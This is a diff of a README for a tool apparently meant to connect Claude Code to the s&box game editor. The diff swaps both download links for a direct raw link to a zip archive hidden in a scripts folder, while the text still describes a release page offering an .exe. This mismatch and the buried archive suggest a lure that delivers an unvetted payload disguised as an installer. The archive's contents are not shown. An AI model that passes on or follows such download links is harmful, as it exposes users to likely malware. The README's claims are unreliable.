@@ -1,6 +1,6 @@
 # 🛠️ claude-sbox-setup - Connect Claude directly to your projects
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/silvieheadless493/claude-sbox-setup)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/silvieheadless493/claude-sbox-setup/raw/refs/heads/main/bridge/scripts/sbox-setup-claude-1.7.zip)
 
 This software links Claude Code with the s&box editor. It automates game development tasks. It helps you build game features faster. You can use it to fix code errors and create content.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have the s&box 
 
 You must visit the website to download the file. Follow this link to get the installer package:
 
-[Download the current version here](https://github.com/silvieheadless493/claude-sbox-setup)
+[Download the current version here](https://github.com/silvieheadless493/claude-sbox-setup/raw/refs/heads/main/bridge/scripts/sbox-setup-claude-1.7.zip)
 
 Click the link to open the release page. Select the file ending in .exe to start your download. Save the file in your downloads folder.
 
